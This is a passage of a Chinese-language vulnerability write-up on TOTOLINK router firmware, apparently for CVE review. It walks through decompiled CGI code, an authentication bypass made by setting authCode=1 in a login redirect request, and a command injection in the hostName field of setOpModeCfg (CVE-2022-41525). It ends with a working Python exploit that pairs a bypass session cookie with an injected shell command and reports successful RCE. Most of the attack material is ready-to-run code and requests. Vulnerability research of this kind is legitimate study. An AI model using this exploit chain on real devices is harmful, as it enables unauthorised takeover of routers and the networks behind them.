class="built_in">strcpy</span>(goURL, <span class="string">&quot;wan_ie.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( atoi(flag) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( wizard_flag )</span><br><span class="line">        <span class="built_in">strcpy</span>(goURL, <span class="string">&quot;phone/wizard.html&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">strcpy</span>(goURL, <span class="string">&quot;phone/home.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( wizard_flag )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(goURL, <span class="string">&quot;wizard.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(goURL, <span class="string">&quot;home.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nvram_set_int_temp(<span class="string">&quot;cloudupg_checktype&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    doSystem(<span class="string">&quot;lktos_reload %s&quot;</span>, <span class="string">&quot;cloudupdate_check 2&gt;/dev/null&quot;</span>);</span><br><span class="line">    authCode = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(flag, <span class="string">&quot;ie8&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(goURL, <span class="string">&quot;login_ie.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( atoi(flag) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(goURL, <span class="string">&quot;phone/login.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(goURL, <span class="string">&quot;login.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( authCode )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_54:</span><br><span class="line">      system(<span class="string">&quot;echo &#x27;&#x27;&gt; /tmp/login_flag&quot;</span>);</span><br><span class="line">      authCode = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_55;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_55:</span><br><span class="line">  <span class="built_in">snprintf</span>(v24, <span class="number">4096</span>, <span class="string">&quot;&#123;\&quot;httpStatus\&quot;:\&quot;%s\&quot;,\&quot;host\&quot;:\&quot;%s\&quot;&quot;</span>, <span class="string">&quot;302&quot;</span>, host);</span><br><span class="line">  v19 = <span class="built_in">strlen</span>(v24);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(flag) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(</span><br><span class="line">      &amp;v24[v19],</span><br><span class="line">      <span class="number">4096</span> - v19,</span><br><span class="line">      <span class="string">&quot;,\&quot;redirectURL\&quot;:\&quot;http://%s/formLoginAuth.htm?authCode=%d&amp;userName=%s&amp;goURL=%s&amp;action=login&amp;flag=1\&quot;&#125;&quot;</span>,</span><br><span class="line">      host,</span><br><span class="line">      authCode,</span><br><span class="line">      input_username,</span><br><span class="line">      goURL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(flag, <span class="string">&quot;ie8&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(</span><br><span class="line">      &amp;v24[v19],</span><br><span class="line">      <span class="number">4096</span> - v19,</span><br><span class="line">      <span class="string">&quot;,\&quot;redirectURL\&quot;:\&quot;http://%s/formLoginAuth.htm?authCode=%d&amp;userName=%s&amp;goURL=%s&amp;action=login&amp;flag=ie8\&quot;&#125;&quot;</span>,</span><br><span class="line">      host,</span><br><span class="line">      authCode,</span><br><span class="line">      input_username,</span><br><span class="line">      goURL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;                           <span class="comment">// 如果登录错误，程序流程走的是该else分支</span></span><br><span class="line">    <span class="built_in">snprintf</span>(                 <span class="comment">//****************************</span></span><br><span class="line">      &amp;v24[v19],</span><br><span class="line">      <span class="number">4096</span> - v19,</span><br><span class="line">      <span class="string">&quot;,\&quot;redirectURL\&quot;:\&quot;http://%s/formLoginAuth.htm?authCode=%d&amp;userName=%s&amp;goURL=%s&amp;action=login\&quot;&#125;&quot;</span>,<span class="comment">// 响应包</span></span><br><span class="line">      host,</span><br><span class="line">      authCode,</span><br><span class="line">      input_username,</span><br><span class="line">      goURL);</span><br><span class="line">  &#125;</span><br><span class="line">  v20 = cJSON_Parse(v24);</span><br><span class="line">  v21 = websGetVar(v20, <span class="string">&quot;redirectURL&quot;</span>, (<span class="type">char</span> *)<span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;HTTP/1.1 302 Redirect to page&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Content-type: text/plain&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Connection: Keep-Alive\nPragma: no-cache\nCache-Control: no-cache&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Location: %s\n\n&quot;</span>, v21);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;protal page&quot;</span>);		<span class="comment">// protal page</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到<code>cgi</code>将登录判定(<code>authCode</code>)通过重定向标志传输给httpd服务</p>
+<p>但是重定向的数据包我们是可以通过<code>brup</code>进行修改,也就是可以控制传入<code>httpd</code>的<code>authCode</code>值!</p>
+<p>如果我们将重定向的<code>url</code>中的<code>authCode</code>字段修改为<code>真</code>,则可以在密码错误的情况下登录</p>
+<p>也就是直接访问<code>192.168.52.134/formLoginAuth.htm?authCode=1&amp;action=login</code></p>
+<p><img src="/images/TOTOLINK/1753716813041.png" alt="1753716813041"></p>
+<p>使用<code>brup</code>修改重定向的<code>GET请求</code>,将重定向中的<code>authCode</code>字段修改为<code>1</code>,</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /formLoginAuth.htm?authCode=1&amp;userName=&amp;goURL=login.html&amp;action=login HTTP/1.1</span><br><span class="line">Host: 192.168.52.134</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Origin: http://192.168.52.134</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.52.134/cgi-bin/cstecgi.cgi?action=login</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+
+<p>此时可以得到一个有效的登录<code>SESSION_ID</code></p>
+<p><img src="/images/TOTOLINK/1753752291522.png" alt="1753752291522"></p>
+<h2 id="3-漏洞分析"><a href="#3-漏洞分析" class="headerlink" title="| 3 | 漏洞分析"></a>| 3 | 漏洞分析</h2><p>我们在<code>cgi</code>文件中对<code>system</code>&#x2F;<code>sprintf</code>等危险函数进行搜索,便可以找到几个可能可以控制参数的利用点</p>
+<h3 id="CVE-2022-41525"><a href="#CVE-2022-41525" class="headerlink" title="CVE-2022-41525"></a>CVE-2022-41525</h3><p>在函数<code>sub_421C98</code>中可以看到</p>
+<p><img src="/images/TOTOLINK/1753752541990.png" alt="1753752541990"></p>
+<p>从<code>POST</code>请求中的<code>hostName</code>字段未经过检查,被拼接进入了<code>doSystem</code></p>
+<p>我们沿着调用链向上找,可以找出唯一的调用链</p>
+<p><code>sub_42B9F8</code>–&gt;<code>sub_422F3C</code>–&gt;<code>sub_421C98</code></p>
+<p>但是<code>sub_42B9F8</code>找不到交叉引用,我们还是可以通过<code>objdump/xxd</code>查看它在<code>elf</code>中何处出现这个函数地址</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zer00ne@zer00ne:~/Desktop/cve_review/stage2/TOTOLINK/_TOTOLINK_C834FR-1C_NR1800X_IP04469_MT7621A_SPI_16M256M_V9.1.0u.6279_B20210910_ALL.web.extracted/squashfs-root/www/cgi-bin$ xxd ./cstecgi.cgi | grep &#x27;f8b9 42&#x27;</span><br><span class="line">0003b150: f8b9 4200 7365 7449 7050 6f72 7446 696c  ..B.setIpPortFil</span><br><span class="line">0003d8e0: 1f00 0000 f8b9 4200 0000 3f80 fcff ffff  ......B...?.....</span><br></pre></td></tr></table></figure>
+
+<p>我们定位回<code>elf</code>中可以看到</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0044B</span>110 aSetopmodecfg:  .ascii <span class="string">&quot;setOpModeCfg&quot;</span>&lt;<span class="number">0</span>&gt;</span><br><span class="line">.data:<span class="number">0044B</span>11D                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>11E                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>11F                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>120                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>121                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>122                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>123                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>124                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>125                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>126                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>127                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>128                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>129                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>12A                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>12B                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>12C                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>12D                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>12E                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>12F                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>130                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>131                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>132                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>133                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>134                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>135                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>136                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>137                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>138                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>139                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>13A                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>13B                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>13C                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>13D                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>13E                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>13F                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>140                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>141                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>142                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>143                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>144                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>145                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>146                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>147                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>148                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>149                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>14A                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>14B                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>14C                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>14D                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>14E                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>14F                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044B</span>150                 .word sub_42B9F8</span><br></pre></td></tr></table></figure>
+
+<p>这个函数与一个字符串对应</p>
+<p>回到<code>cgi</code>的登录逻辑,我们可以发现登录检查函数与<code>sub_42B9F8</code>相似,也是函数指针与一个字符串对应,且对应的地址还有符号</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0044</span>C034 key:            .ascii <span class="string">&quot;loginAuth&quot;</span>&lt;<span class="number">0</span>&gt;    # DATA XREF: LOAD:<span class="number">004007F</span>4↑o</span><br><span class="line">.data:<span class="number">0044</span>C034                                          <span class="meta"># main+6C8↑o ...</span></span><br><span class="line">.data:<span class="number">0044</span>C03E                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C03F                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C040                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C041                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C042                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C043                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C044                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C045                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C046                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C047                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C048                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C049                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C04A                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C04B                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C04C                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C04D                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C04E                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C04F                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C050                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C051                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C052                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C053                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C054                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C055                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C056                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C057                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C058                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C059                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C05A                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C05B                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C05C                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C05D                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C05E                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C05F                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C060                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C061                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C062                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C063                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C064                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C065                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C066                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C067                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C068                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C069                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C06A                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C06B                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C06C                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C06D                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C06E                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C06F                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C070                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C071                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C072                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C073                 .byte    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0044</span>C074 val:            .word check              # DATA XREF: main+<span class="number">6</span>CC↑r</span><br></pre></td></tr></table></figure>
+
+<p>我们查看这个符号在什么地方被引用,可以找到这是在<code>main</code>函数中的一段逻辑</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">Var = websGetVar(v17, &quot;topicurl&quot;, (int)&quot;&quot;);</span><br><span class="line">...</span><br><span class="line">  if ( strstr(Var, &quot;get&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    func_ptr = off_44A090;</span><br><span class="line">    v24 = &amp;off_44A0D4;</span><br><span class="line">    if ( off_44A090 )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = 0;</span><br><span class="line">      while ( strncmp(Var, &amp;get_handle_t[68 * v25], 64) )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v25;</span><br><span class="line">        func_ptr = *v24;</span><br><span class="line">        v26 = *v24 != 0;</span><br><span class="line">        v24 += 17;</span><br><span class="line">        if ( !v26 )</span><br><span class="line">          goto LABEL_54;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_52:</span><br><span class="line">      ((void (__fastcall *)(int))func_ptr)(v17);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( strstr(Var, &quot;set&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    func_ptr = off_44B040;</span><br><span class="line">    v27 = &amp;off_44B084;</span><br><span class="line">    if ( off_44B040 )</span><br><span class="line">    &#123;</span><br><span class="line">      v28 = 0;</span><br><span class="line">      while ( strncmp(Var, &amp;set_handle_t[68 * v28], 64) )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v28;</span><br><span class="line">        func_ptr = *v27;</span><br><span class="line">        v26 = *v27 != 0;</span><br><span class="line">        v27 += 17;</span><br><span class="line">        if ( !v26 )</span><br><span class="line">          goto LABEL_54;</span><br><span class="line">      &#125;</span><br><span class="line">      goto LABEL_52;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !strstr(Var, &quot;del&quot;) )</span><br><span class="line">    &#123;</span><br><span class="line">      func_ptr = val;                           // 0x44C074</span><br><span class="line">      if ( !val )</span><br><span class="line">        goto LABEL_54;</span><br><span class="line">      v31 = &amp;off_44C0B8;</span><br><span class="line">      v32 = 0;</span><br><span class="line">      while ( strncmp(Var, &amp;key[68 * v32], 64) )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v32;</span><br><span class="line">        func_ptr = *v31;</span><br><span class="line">        v26 = *v31 != 0;</span><br><span class="line">        v31 += 17;</span><br><span class="line">        if ( !v26 )</span><br><span class="line">          goto LABEL_54;</span><br><span class="line">      &#125;</span><br><span class="line">      goto LABEL_52;                            // call</span><br><span class="line">    &#125;</span><br><span class="line">    func_ptr = off_44BD00;</span><br><span class="line">    v29 = &amp;off_44BD44;                          // 0x44BD44</span><br><span class="line">    if ( off_44BD00 )</span><br><span class="line">    &#123;</span><br><span class="line">      v30 = 0;</span><br><span class="line">      while ( strncmp(Var, &amp;del_handle_t[68 * v30], 64) )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v30;</span><br><span class="line">        func_ptr = *v29;</span><br><span class="line">        v26 = *v29 != 0;</span><br><span class="line">        v29 += 17;</span><br><span class="line">        if ( !v26 )</span><br><span class="line">          goto LABEL_54;</span><br><span class="line">      &#125;</span><br><span class="line">      goto LABEL_52;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">LABEL_52:</span><br><span class="line">      ((void (__fastcall *)(int))func_ptr)(v17);</span><br></pre></td></tr></table></figure>
+
+<p>这是个根据<code>topicurl</code>的字段,选择调用不同的函数</p>
+<p>所以我们要在这里将<code>topicurl字段</code>注入<code>setOpModeCfg</code>便可以调用到<code>sub_42B9F8</code></p>
+<p><img src="/images/TOTOLINK/1753755389818.png" alt="1753755389818"></p>
+<p>之后无论如何都可以调用到<code>sub_422F3C</code></p>
+<p><img src="/images/TOTOLINK/1753755429607.png" alt="1753755429607"></p>
+<p>最后进入<code>sub_421C98</code>,简单逆向分析可以知道,</p>
+<p>应该把<code>proto</code>设置为<code>1,2</code>或<code>5</code></p>
+<p><code>switchOpMode</code>设置为<code>1</code></p>
+<p><code>hostName</code>设置为<code>&#39;;&#123;command&#125;;&#39;</code>(绕过单引号),便可以注入命令</p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.52.134/cgi-bin/cstecgi.cgi&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;SESSION_ID=2:1753440050:2&quot;</span>&#125;	//绕过登录时获得的有效cookie</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;topicurl&quot;</span> : <span class="string">&quot;setOpModeCfg&quot;</span>,</span><br><span class="line">	<span class="string">&quot;proto&quot;</span> : <span class="string">&quot;5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;switchOpMode&quot;</span> : <span class="string">&quot;1&quot;</span>,</span><br><span class="line">	<span class="string">&quot;hostName&quot;</span> : <span class="string">&quot;&#x27;;ls -al /;&#x27;&quot;</span>      </span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url, json=data, cookies=cookie)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+
+<p>成功<code>RCE</code></p>
+<p><img src="/images/TOTOLINK/1753755819283.png" alt="1753755819283"></p>
